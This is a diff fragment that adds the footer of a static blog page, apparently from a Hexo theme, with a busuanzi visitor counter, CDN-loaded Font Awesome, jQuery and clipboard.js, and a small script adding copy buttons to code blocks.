+                      本站访客数<span id="busuanzi_value_site_uv"></span>人
+              </span>
+            <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            
+          </ul>
+        </nav>
+      </div>
+      
+</footer>
+
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
